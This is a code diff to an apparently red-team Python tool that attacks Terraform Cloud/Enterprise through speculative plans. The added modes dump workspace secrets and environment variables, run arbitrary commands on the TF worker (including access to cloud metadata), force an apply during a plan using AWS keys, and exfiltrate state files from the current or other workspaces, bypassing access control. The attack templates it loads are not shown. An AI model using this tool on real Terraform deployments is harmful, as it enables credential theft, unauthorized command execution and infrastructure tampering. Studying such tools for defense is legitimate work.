@@ -1,8 +1,7 @@
 import argparse
 import os
+import sys
 import subprocess
-#from terrasnek.api import TFC
-#import terrasnek.exceptions
 import json
 from string import Template
 import tempfile
@@ -10,19 +9,27 @@ import shutil
 import glob
 import re
 
-# It checks if the terraform binary is present in the system
+VERBOSE=False
+SCRIPT_PATH = ""
+
+def get_script_path():
+    return os.path.dirname(os.path.realpath(sys.argv[0]))
+
+# Check if the terraform binary is present in the system
 def check_terraform_binary():
     try:
         output = subprocess.check_output("terraform --version".split())
         output = output.decode('ascii')
+        if VERBOSE:
+            print(f"[+] Output: {output}")
         print("[+] Found terraform client, %s" % output.split('\n')[0])
         return True
     except FileNotFoundError as f:
         return False
 
-# It creates a temporal folder that will be used by the terraform client.
-# It adds to the folder a backend.tf with the TFC/TFE backend properlly configured
-def setup_temp_folder(hostname, organization, workspace):
+# Create a temporal folder that will be used by the terraform client.
+# It adds to the folder a backend.tf with the TFC/TFE backend properly configured
+def setup_temp_folder(hostname, organization, workspace, terraform_folder):
     # Using: https://docs.python.org/3.4/library/string.html#template-strings
     s = Template(open(os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/backend.tf")).read())
     backend_str = s.substitute(hostname=hostname, organization=organization, workspace=workspace)
@@ -30,34 +37,21 @@ def setup_temp_folder(hostname, organization, workspace):
     tmp_folder = tempfile.mkdtemp()
     with open(os.path.join(tmp_folder, 'backend.tf'), "w") as backend:
         backend.write(backend_str)
+    if terraform_folder != "":
+        os.mkdir(os.path.join(tmp_folder, terraform_folder))
     return tmp_folder
 
-# It performs a speculative plan and gets all the environment variables configured in the workspace.
-# .tfvars and env
-#
-# Note:
-# It would be possible to do this without the terraform client, using the API, but it's a bit more complicate:
-# More info about the workflow to start a speculative run with the TFC API
-# https://www.terraform.io/docs/cloud/run/api.html#summary
-# First we need to create a configuration version with the template
-# https://www.terraform.io/docs/cloud/api/configuration-versions.html#create-a-configuration-version
-# Then upload it: 
-# https://www.terraform.io/docs/cloud/api/configuration-versions.html#upload-configuration-files
-# We could use this example:
-# https://github.com/dahlke/terrasnek/blob/master/test/config_versions_test.py#L76
-# Then we create a run for that configuration version
-# https://www.terraform.io/docs/cloud/api/run.html#sample-payload
-# We would need a loop checking for the run status:
-# https://www.terraform.io/docs/cloud/api/run.html#get-run-details
-# Finally we can get the result of the run with the env vars
-def get_all_envs(tmp_folder, hostname, organization, workspace):
-    # Copying template for attack to temp folder
-    src_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "templates/get_all_envs.tf")
-    dst_file = os.path.join(tmp_folder, "get_all_envs.tf")
+# Perform a speculative plan to get all the environment variables configured in the workspace.
+# Outputs the values of the secrets as null_resource resources
+def get_all_envs(tmp_folder, terraform_folder):
+    # Copying template of the attack to temp folder
+    src_file = os.path.join(SCRIPT_PATH, "templates/get_all_envs.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "get_all_envs.tf")
     shutil.copy(src_file, dst_file)
     
     # Running a speculative plan
-    results = run_speculative_plan(tmp_folder)
+    targets = ["null_resource.null_tfvars", "null_resource.null_envvars"]
+    results = run_speculative_plan(tmp_folder, targets)
     
     # Parsing and printing out the results
     print("[+] Terraform Variables from terraform.tfvars:")
@@ -70,15 +64,125 @@ def get_all_envs(tmp_folder, hostname, organization, workspace):
         secret = re.search("          \+ (.*)\n        }", result, re.DOTALL).group(1)
         print("\t" + secret)
 
-# Runs a specualtive plan in TFC/TFE and gets the output
+# Perform a speculative plan which executes a command from the TF worker.
+def exec_command(tmp_folder, terraform_folder, command):
+    # Copying template of the attack to temp folder
+    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "exec_command.tf")
+    shutil.copy(src_file, dst_file)
+    
+    s = Template(open(dst_file, "r").read())
+    template_filled = s.substitute(command=command)
+    open(dst_file, "w").write(template_filled)
+
+    # Running a speculative plan
+    targets = ["null_resource.null"]
+    results = run_speculative_plan(tmp_folder, targets)
+
+    #print(results)    
+    # Parsing and printing results from the output of the null resource trigger
+    result = re.search("output\" = (.*)       }", results, re.DOTALL).groups(1)[0]
+    # The output is a partial json, we replace some characters here but it's not comprensive
+    result = result.replace("\\n", "\n")
+    print(f"[+] Output of the command: {result}")
+
+# Performs a terraform apply during a speculative plan with some hardcoded resources; creates an s3 bucket
+def apply_on_plan(tmp_folder, terraform_folder, aws_access_key_variable, aws_secret_key_variable):
+    # We add the "malicious tf file" which will create an AWS S3 bucket
+    src_file = os.path.join(SCRIPT_PATH, "templates/s3_bucket.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "template_s3_bucket")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+
+    # We add the bash script that performs the apply
+    # Pretend the malicious script is a .tpl file
+    src_file = os.path.join(SCRIPT_PATH, "templates/apply_on_plan.sh")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "apply_on_plan.sh")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+
+    # Copying the provider and replacing the templated variables
+    src_file = os.path.join(SCRIPT_PATH, "templates/provider_template.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "provider")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+    s = Template(open(dst_file, "r").read())
+    # The command we will run is a bash script
+    template_filled = s.substitute(access_key_variable=aws_access_key_variable, secret_key_variable=aws_secret_key_variable)
+    open(dst_file, "w").write(template_filled)
+
+    # Copying template to execute a command
+    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "exec_command.tf")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+    s = Template(open(dst_file, "r").read())
+    # The command we will run is a bash script
+    template_filled = s.substitute(command="bash apply_on_plan.sh")
+    open(dst_file, "w").write(template_filled)
+
+    # Running a speculative plan
+    targets = ["null_resource.null"]
+    results = run_speculative_plan(tmp_folder, targets)
+
+    #print(results)    
+    # Parsing and printing results from the output of the null resource trigger
+    result = re.search("output\" = (.*)       }", results, re.DOTALL).groups(1)[0]
+    # The output is a partial json, we replace some characters here but it's not comprensive
+    result = result.replace("\\n", "\n")
+    print(f"[+] Output of the command: {result}")
+
+def get_state_file(tmp_folder, terraform_folder, workspace=None):
+    # Copying template to execute a command
+    src_file = os.path.join(SCRIPT_PATH, "templates/exec_command.tf")
+    
+    dst_file = os.path.join(tmp_folder, terraform_folder, "exec_command.tf")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+
+    s = Template(open(dst_file, "r").read())
+    # The command we will run is a bash script
+    if workspace != None:
+        command = f"bash retrieve_state_file.sh {workspace}"
+        template_filled = s.substitute(command=command)
+    else:
+        template_filled = s.substitute(command="bash retrieve_state_file.sh")
+    open(dst_file, "w").write(template_filled)
+
+    # We add the bash script that performs the tf statefile exfil
+    src_file = os.path.join(SCRIPT_PATH, "templates/retrieve_state_file.sh")
+    dst_file = os.path.join(tmp_folder, terraform_folder, "retrieve_state_file.sh")
+    print(f"[+] Copying template file from {src_file} to {dst_file}")
+    shutil.copy(src_file, dst_file) 
+
+    # Running a speculative plan
+    targets = ["null_resource.null"]
+    results = run_speculative_plan(tmp_folder, targets)
+  
+    # Parsing and printing results from the output of the null resource trigger
+    result = re.search("output\" = (.*)       }", results, re.DOTALL).groups(1)[0]
+    # The output is a partial json, we replace some characters here but it's not comprensive
+    result = result.replace("\\n", "\n")
+    print(f"[+] Output of the command: {result}")
+
+# Runs a speculative plan in TFC/TFE and gets the output
 # It handles these scenarios:
 #  * No valid credentails to run the speculative plan
 #  * Issues when using a relative folder
-def run_speculative_plan(tmp_folder):
+def run_speculative_plan(tmp_folder, targets):
+    
+    # Targeting around the existing TF state to reduce prerequisite TF resource declaration
+    targets_args = ""
+    for target in targets:
+        targets_args += f"-target={target} "
+
     command = "terraform init -no-color"
     print(f"[+] Executing: {command}")
     output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
     output = output.decode('ascii')
+    if VERBOSE:
+        print(f"[+] Output: {output}")
+
     # ToDo: Use a logging library for debug messages
     # if debug:
     #     print(f"[+] Output:" {output}")
@@ -88,10 +192,13 @@ def run_speculative_plan(tmp_folder):
     if not "Terraform has been successfully initialized!" in output:
         print("[!] Error running `terraform init` this is unexpected")
         exit(-1)
-    command = "terraform plan -no-color"
+    command = f"terraform plan -no-color {targets_args}"
     print(f"[+] Executing: {command}")
+
     output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
     output = output.decode('ascii')
+    if VERBOSE:
+        print(f"[+] Output: {output}")
     # This happens when the workspace is configured to use a folder relative to the target repository
     # We need to create that folder and move the files there
     if "can't cd to /terraform/" in output:
@@ -109,57 +216,47 @@ def run_speculative_plan(tmp_folder):
             shutil.move(file, target_dir)
 
         #move all *.tf to target_dir
-        command = "terraform plan -no-color"
+        command = f"terraform plan -no-color {targets_args}"
         print(f"[+] Executing: {command}")
         output = subprocess.run(command.split(), cwd=tmp_folder, stdout=subprocess.PIPE).stdout
         output = output.decode('ascii')
+        if VERBOSE:
+            print(f"[+] Output: {output}")
 
     return output
-
-# def get_atlas_token():
-#     # ToDo: implement. Open the default file `~/.terraform.d/credentials.tfrc.json` (support windows/nix?) and get the token for the hostname
-#     return ""
-
-# Check to see if we have permissions to do what we need
-# def check_token_and_permissions(hostname, organization, workspace, token):
-#     api = TFC(token, url=hostname, verify=False)
-#     try:
-#         org_info = api.orgs.show(organization)
-#     except terrasnek.exceptions.TFCHTTPNotFound:
-#         print(f"[!] Atlas token doesn't have access to the organization {organization}") 
-#         return False
-#     api.set_org(organization)
-#     try:
-#         workspace_info = api.workspaces.show(workspace)
-#         # ToDo: check if the workspace is locked
-#         print(f"[+] Permissions for the workspace {workspace}")
-#         print(json.dumps(workspace_info['data']['attributes']['permissions'], indent=4))
-#         if not workspace_info['data']['attributes']['permissions']['can-queue-run']:
-#             print("[!] The token doesn't have permissions to queue a run!")
-#             return False
-#     except terrasnek.exceptions.TFCHTTPNotFound:
-#         print(f"[!] Atlas token doesn't have access to the workspace {workspace}") 
-#         return False
-#     return True
-
-
+    
 def parse_args():
     arg_parser = argparse.ArgumentParser()
     arg_parser.add_argument('--hostname', type=str, help="Terraform Cloud or Enterprise URL. eg: https//app.terraform.io", required=True)
     arg_parser.add_argument('--organization', type=str, help="Terraform organization", required=True)
     arg_parser.add_argument('--workspace', type=str, help="Terraform workspace", required=True)
-    #arg_parser.add_argument('--token', type=str, help="ATLAS token, if not specified the one in the system (~/.terraform.d/credentials.tfrc.json) will be used. To get one run `terraform login $HOSTNAME`", required=True)
-    # Show all of these under a attacks category
-    # ToDo: check that we are at least using one of this
-    arg_parser.add_argument('--get_envs', action='store_true', help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
-    #arg_parser.add_argument('--get_state_file', type=str, help="It gets the state file just doing a plan, useful when the ATLAS TOKEN doesn't have permissions to access the state file")
-    #arg_parser.add_argument('--get_all_state_files_from_org', type=str, help="Gets the ATLAS TOKEN used during a speculative run (plan), and abuse the implicit permissions to get the state files of all workspaces in the organization")
-    #arg_parser.add_argument('--exec_command', type=str, help="Runs a command in the container used to run the speculative plan, useful to access TFC infra and access Cloud metadata if misconfigured")    
-    return arg_parser.parse_args()
+    arg_parser.add_argument('--folder', type=str, help="Folder in the repo that contains the terraform files where you wish the attack to take place", required=False)
+    arg_parser.add_argument('--verbose', action='store_true', help="It shows the output of the execution of each command")
 
+    attack = arg_parser.add_mutually_exclusive_group(required=True)
+    attack.add_argument('--get_envs', action='store_true', help="This retrieves the environment variables from a TF workspaces")
+    attack.add_argument('--get_state_file', action='store_true', help="This retrieves the state file of the current TF workspace through a TF plan; bypasses TF workspace access control")
+    attack.add_argument('--get_state_file_from_workspace', type=str, help="This retrieves the state file of a supplied workspace name through a TF plan; bypasses TF workspace access control")
+    attack.add_argument('--exec_command', type=str, help="Runs a command on the TF Worker used to run the speculative plan, useful to access TFC infra and Cloud metadata")    
+    attack.add_argument('--apply_on_plan', action='store_true', help="Perform a TF Apply through a TF Plan")
+    apply_group = attack.add_argument_group()
+    apply_group.add_argument('--aws_access_key_variable', type=str, help="Name of env var holding the AWS access key. Use with --apply_on_plan")    
+    apply_group.add_argument('--aws_secret_key_variable', type=str, help="Name of env var holding the AWS secret key. Use with --apply_on_plan")
+    apply_group.add_argument('--assume_role', action='store_true', help="Use this if TF workers are assuming role of an instance profile.  Use with --apply_on_plan")
+    
+    return arg_parser.parse_args()
 
 def main():
     args = parse_args()
+    global SCRIPT_PATH
+    SCRIPT_PATH = get_script_path()
+
+    if args.folder == None:
+        args.folder = ""
+
+    if args.verbose:
+        global VERBOSE
+        VERBOSE = True
     if not check_terraform_binary():
         # ToDo: Ideally we would point out to the user the same version as the used in the workspace. Not sure how to get this.
         print("terraform binary not found in your system. You can download from here: https://www.terraform.io/downloads.html")
@@ -169,17 +266,24 @@ def main():
     #     args.token = get_atlas_token()    
 
     # Create a temp folder to use it during the attack
-    tmp_folder = setup_temp_folder(args.hostname, args.organization, args.workspace)
+    tmp_folder = setup_temp_folder(args.hostname, args.organization, args.workspace, args.folder)
     print(f"[+] Created temporal folder {tmp_folder}")
 
     # if not check_token_and_permissions(args.hostname, args.organization, args.workspace):
     #     exit(-1)
-    # # ToDo: Based on the attack selected call a different function
     if args.get_envs:
-        get_all_envs(tmp_folder, args.hostname, args.organization, args.workspace)
-
+        get_all_envs(tmp_folder, args.folder)
+    elif args.exec_command:
+        exec_command(tmp_folder, args.folder, args.exec_command)
+    elif args.apply_on_plan:
+        apply_on_plan(tmp_folder, args.folder, args.aws_access_key_variable, args.aws_secret_key_variable)
+    elif args.get_state_file:
+        get_state_file(tmp_folder, args.folder)
+    elif args.get_state_file_from_workspace:
+        get_state_file(tmp_folder, args.folder, args.get_state_file_from_workspace)
+  
     # Remove temporal folder
-    shutil.rmtree(tmp_folder)
+    #shutil.rmtree(tmp_folder)
 
 if __name__ == "__main__":
     main()
